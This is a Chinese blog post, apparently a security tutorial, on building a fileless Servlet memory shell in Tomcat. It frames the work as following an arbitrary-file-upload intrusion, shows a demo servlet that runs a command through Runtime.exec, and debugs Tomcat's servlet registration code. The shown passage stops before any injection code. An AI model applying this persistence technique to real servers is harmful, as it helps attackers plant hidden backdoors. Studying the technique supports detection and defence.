@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <meta name="robots" content="index, follow">
+  <!-- title -->
+  
+    
+  <title>从0实现Servlet内存马 - Hello Hehanzzz~</title>
+    
+  
+  
+  <!-- open graph -->
+  <meta name="description" content="Java从0实现Servlet内存马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0实现Servlet内存马">
+<meta property="og:url" content="https://hehanzzz.github.io/2025/01/01/%E4%BB%8E0%E5%AE%9E%E7%8E%B0Servlet%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Hello Hehanzzz~">
+<meta property="og:description" content="Java从0实现Servlet内存马">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105135844-wc3i7zk.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105135523-rqefnts.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105135956-5abvy1d.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105140328-z21sdvj.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105140617-fk6vlxh.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105141143-djzox9i.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105141454-xmn4722.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105143959-5yac9lk.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105145950-9kco9r7.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105151203-e4z9tis.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105153443-c89okri.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105153930-bo7timg.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105155300-5tbwv5q.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105161437-06f9k11.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105161732-3u59q0w.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105154803-jwq38jv.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105160143-0wkd2kt.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105160215-busneu9.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105160340-x9mu5pa.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105160454-i3ztjx9.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105163440-m8ftf7r.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105163748-faa0vbq.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105164142-zwehdvz.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105164325-bp35sch.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105164813-e3t0x1s.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105164647-1f7dp4f.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105165216-8c85ndv.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105170635-dx7vtsu.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105172941-iycdpb6.png">
+<meta property="og:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105174120-7o5z339.png">
+<meta property="article:published_time" content="2025-01-01T13:15:53.000Z">
+<meta property="article:modified_time" content="2025-01-05T13:49:03.638Z">
+<meta property="article:author" content="Hehanzzz">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/HeHansen/Desktop/assets/image-20250105135844-wc3i7zk.png">
+  <!-- canonical -->
+  
+  <link rel="canonical" href="https://hehanzzz.github.io/2025/01/01/从0实现Servlet内存马/">
+  
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/img/3.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+  <!-- CSS -->
+  
+<link rel="stylesheet" href="/css/reset.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/markdown.css">
+
+  
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Hello Hehanzzz~</a>
+    <!-- <div class="logo"><a href="/" title="Len"><img src="/img/logo.svg" alt="Len" aria-label="logo" height="20"></a></div> -->
+        <ul class="nav">
+            
+            <li><a href="/">Home</a></li>
+            
+            <li><a href="/about">About</a></li>
+            
+            <li><a href="/archives">Archives</a></li>
+            
+        </ul>
+
+
+    </a>
+</div>
+
+                
+                <div class="post-main">
+    
+        <div class="post-main-title">
+            从0实现Servlet内存马
+        </div>
+        <div class="post-meta">
+            2025-01-01 ｜ 
+            
+        </div>
+        <!-- 圆角分类 -->
+        <!-- <div class="tags"> -->
+            <!--  -->
+        <!-- </div> -->
+        <div class="post-md">
+            <p>Java从0实现Servlet内存马</p>
+<span id="more"></span>
+
+<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Servlet是Tomcat的特性</p>
+<p>所以Servlet内存马是Tomcat框架下的</p>
+<p>本次的内容是Servlet内存马，既然是内存马，那就有两部份很重要</p>
+<p>1.Java的Servlet马</p>
+<p>2.将这个马注册进Tomcat中</p>
+<p>全文将要围绕这两部份进行</p>
+<p><strong>本次模拟的环境是，我们发现了一个任意文件上传漏洞，可以上传JSP到服务器下面</strong>（其实就是先传一个小马，然后用小马生成一个不留痕迹没有文件的内存马）</p>
+<h1 id="0x01-创建项目"><a href="#0x01-创建项目" class="headerlink" title="0x01 创建项目"></a>0x01 创建项目</h1><p>选择EE</p>
+<p>把模版到Web应用程序勾选，还有应用程序服务器选择Tomcat</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105135844-wc3i7zk.png" alt="image">​</p>
+<p>选择Java EE 8</p>
+<p>把Servlet勾选上</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105135523-rqefnts.png" alt="image">​</p>
+<p>出现下面这些就是创建成功了</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105135956-5abvy1d.png" alt="image">​</p>
+<p>先构建运行先</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105140328-z21sdvj.png" alt="image">​</p>
+<p>成功</p>
+<h1 id="0x02-前置知识"><a href="#0x02-前置知识" class="headerlink" title="0x02 前置知识"></a>0x02 前置知识</h1><p>在 HelloServlet.java 中我们的路由是通过注解的形式写的</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105140617-fk6vlxh.png" alt="image">​</p>
+<p>这样写当然可以，但是我们可以通过配置的形式（src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml）去写</p>
+<p>我们把这一行注解删除，然后把下面的写入 web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Memshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.memshell.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Memshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/memshell<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105141143-djzox9i.png" alt="image">​</p>
+<p>然后访问 <a target="_blank" rel="noopener" href="http://localhost:8080/Memshell_war_exploded/memshell">http://localhost:8080/Memshell_war_exploded/memshell</a></p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105141454-xmn4722.png" alt="image">​</p>
+<p>可以看到成功访问了</p>
+<p>到这里我们其实就是相当于把路由通过配置文件注册进Servtlet</p>
+<p>到后面我们就是要去模拟这个步骤</p>
+<p>（这里把 Memshell_war_exploded 二级目录去掉：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MeepoW/article/details/104429400%EF%BC%89">https://blog.csdn.net/MeepoW/article/details/104429400）</a></p>
+<h1 id="0x03-简单写个马子"><a href="#0x03-简单写个马子" class="headerlink" title="0x03 简单写个马子"></a>0x03 简单写个马子</h1><p>然后我们简单写一个马子，这里就用弹计算器来演示了</p>
+<p>将 com&#x2F;example&#x2F;memshell&#x2F;HelloServlet.java 的内容改为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello MemShell!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105143959-5yac9lk.png" alt="image">​</p>
+<p>成功弹出计算器</p>
+<h1 id="0x04-注册路由分析"><a href="#0x04-注册路由分析" class="headerlink" title="0x04 注册路由分析"></a>0x04 注册路由分析</h1><p>到这里我们就得详细分析一下路由的构建过程了，不然我们没法通过模拟tomcat构建路由的过程去注册路由</p>
+<p>网上有很多的网站都是逆着来分析的，也就是从结束往前推</p>
+<p>他们的分析断点大都打在这里</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105145950-9kco9r7.png" alt="image">​</p>
+<p>我们这里不一样，跟着B站UP主白日梦组长一样，从前往后来</p>
+<p>这样的好处就在于我们很清晰明了的可以知道构建的过程，经过了什么步骤，配合上网上Tomcat源码分析的流程图，很快就可以清楚</p>
+<p>在接下来之前我们可以粗略下面的文章，主要是流程图和架构图：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010883443/article/details/107463782">https://blog.csdn.net/u010883443/article/details/107463782</a></li>
+<li><a target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/e0157398fdc5f76b582d59f778b63040.png">https://i-blog.csdnimg.cn/blog_migrate/e0157398fdc5f76b582d59f778b63040.png</a></li>
+<li><a target="_blank" rel="noopener" href="https://img-blog.csdn.net/20180108201104048?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGxnZW4xNTczODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">https://img-blog.csdn.net/20180108201104048?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGxnZW4xNTczODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast</a></li>
+</ul>
+<p>然后我们直接把断点下在Tomcat初始化的地方</p>
+<p>下面是我们主要关注的Tomcat初始化部分的流程图</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105151203-e4z9tis.png" alt="image">​</p>
+<p>可以看到在加载 web.xml 后，对配置文件进行了读取解析，简单理解就是他是如何将下面这些东西变成路由的</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Memshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.memshell.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Memshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/memshell<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据这个图，我们可以去找一下Tomcat中对应的流程</p>
+<p>为了简化工作量，先从xml赋值开始吧，我们去照 ConfigureContext 方法</p>
+<p>在此之前，我们先去pox.xml下引入tomcat</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.89<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>version这里选择自己的版本</p>
+<p>然后在idea右边的maven中刷新，就会自己下载依赖了</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105153443-c89okri.png" alt="image">​</p>
+<p>然后全局搜索 ConfigureContext</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105153930-bo7timg.png" alt="image">​</p>
+<p>（从 ConfigureStart 开始也可以，从这里开始的话调用链就是 ConfigureStart() -&gt; this.webConfig() -&gt; this.configureContext(webXml)，在后续调试中也可以看到）</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105155300-5tbwv5q.png" alt="image">​</p>
+<p>我这里先对整个 configureContext 方法中涉及 Servlet 的进行简单了解，好方便之后打断点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">    <span class="comment">// 设置上下文的公共标识符</span></span><br><span class="line">    <span class="built_in">this</span>.context.setPublicId(webxml.getPublicId());</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 设置上下文的主版本和次版本</span></span><br><span class="line">    <span class="built_in">this</span>.context.setEffectiveMajorVersion(webxml.getMajorVersion());</span><br><span class="line">    <span class="built_in">this</span>.context.setEffectiveMinorVersion(webxml.getMinorVersion());</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 遍历并添加上下文参数</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> webxml.getContextParams().entrySet().iterator();</span><br><span class="line">    Map.Entry entry;</span><br><span class="line">    <span class="keyword">while</span> (var2.hasNext()) &#123;</span><br><span class="line">        entry = (Map.Entry) var2.next();</span><br><span class="line">        <span class="built_in">this</span>.context.addParameter((String) entry.getKey(), (String) entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 Servlet 定义</span></span><br><span class="line">    var35 = webxml.getServlets().values().iterator();</span><br><span class="line">    Iterator var7;</span><br><span class="line">    <span class="keyword">while</span> (var35.hasNext()) &#123;</span><br><span class="line">        <span class="type">ServletDef</span> <span class="variable">servlet</span> <span class="operator">=</span> (ServletDef) var35.next();</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="built_in">this</span>.context.createWrapper();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置加载顺序，也就是预加载，如果你配置了这个配置那就会在访问前提前加载出来</span></span><br><span class="line">        <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setLoadOnStartup(servlet.getLoadOnStartup());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置是否启用</span></span><br><span class="line">        <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setEnabled(servlet.getEnabled());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 Servlet 名称</span></span><br><span class="line">        wrapper.setName(servlet.getServletName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置初始化参数</span></span><br><span class="line">        Map&lt;String, String&gt; params = servlet.getParameterMap();</span><br><span class="line">        var7 = params.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (var7.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, String&gt; entry = (Map.Entry) var7.next();</span><br><span class="line">            wrapper.addInitParameter((String) entry.getKey(), (String) entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 RunAs 用户</span></span><br><span class="line">        wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置安全角色引用</span></span><br><span class="line">        Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var37</span> <span class="operator">=</span> roleRefs.iterator();</span><br><span class="line">        <span class="keyword">while</span> (var37.hasNext()) &#123;</span><br><span class="line">            <span class="type">SecurityRoleRef</span> <span class="variable">roleRef</span> <span class="operator">=</span> (SecurityRoleRef) var37.next();</span><br><span class="line">            wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 Servlet 类</span></span><br><span class="line">        wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置文件上传配置</span></span><br><span class="line">        <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">        <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1L</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(multipartdef.getLocation(), maxFileSize, maxRequestSize, fileSizeThreshold));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置是否支持异步</span></span><br><span class="line">        <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setAsyncSupported(servlet.getAsyncSupported());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置是否可覆盖</span></span><br><span class="line">        wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加子组件</span></span><br><span class="line">        <span class="built_in">this</span>.context.addChild(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 Servlet 映射</span></span><br><span class="line">    var35 = webxml.getServletMappings().entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (var35.hasNext()) &#123;</span><br><span class="line">        Map.Entry&lt;String, String&gt; entry = (Map.Entry) var35.next();</span><br><span class="line">        <span class="built_in">this</span>.context.addServletMappingDecoded((String) entry.getKey(), (String) entry.getValue());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先是</p>
+<ol>
+<li><p>创建 Servlet Wrapper</p>
+</li>
+<li><p>设置 Servlet 配置</p>
+<p>将 <code>Wrapper</code>​ 添加到上下文：通过 <code>this.context.addChild(wrapper)</code>​ 将配置好的 <code>Wrapper</code>​（Servlet）添加到上下文中，完成 Servlet 的注册</p>
+</li>
+<li><p>Servlet 映射到 URL 模式</p>
+</li>
+</ol>
+<p>这里给不是很懂 java 架构的朋友解释一下</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105161437-06f9k11.png" alt="image">​</p>
+<p>这里的每个框框里面的其实都是Standard（标准）</p>
+<p>第一个框框的Engine就是标准网站，第二个Host就是标准域名，到后面 StandardContext 里面有StandardWrapper</p>
+<p>（<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_37557894/article/details/139958469%EF%BC%89%EF%BC%8CJava%E4%BC%9A%E6%8A%8A">https://blog.csdn.net/weixin_37557894/article/details/139958469），Java会把</a> Servlet 放在Wrapper里</p>
+<p>Wrapper 就是实现映射器Map找对应的URI的</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105161732-3u59q0w.png" alt="image">​</p>
+<p>所以我们对注册的部分打上断点</p>
+<p>先给第一行打一个断点，简单了解一下最开始的读配置文件后的东西</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105154803-jwq38jv.png" alt="image">​</p>
+<p>慢慢调试</p>
+<p>在右下角我们可以看到有三个东西</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105160143-0wkd2kt.png" alt="image">​</p>
+<p>其中webxml就是它解析的xml文件</p>
+<p>我们点开，在其中可以看到我们的 servlet ，其中前两个都是默认的，第三个是我们注册的</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105160215-busneu9.png" alt="image">​</p>
+<p>在我们注册的路由中有一对Map</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105160340-x9mu5pa.png" alt="image">​</p>
+<p>value中存放着我们的 servletName 和 servletClass</p>
+<p>这里其实就是我们前面写在配置文件里面的</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105160454-i3ztjx9.png" alt="image">​</p>
+<p>在流程图中我们也可以知道目前是它已经完成了xml解析，现在是一步步看看它是如何注册的</p>
+<p>根据我前面写的注释，我们可以在以下的几个关键点打断点（如果有疑问这些断点是怎么来的，可以不打断点自己一步步看）</p>
+<p>在下面这两行下个断点，可以把第一个断点取消了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="built_in">this</span>.context.createWrapper();</span><br><span class="line"></span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105163440-m8ftf7r.png" alt="image">​</p>
+<p>刚开始调试的Servlet是Default</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105163748-faa0vbq.png" alt="image">​</p>
+<p>我们直接⏩快进到我们的Servlet</p>
+<p>首先会给我们的 wrapper 设置一个name，这个name就是我们前面的servlet的名字——memshell</p>
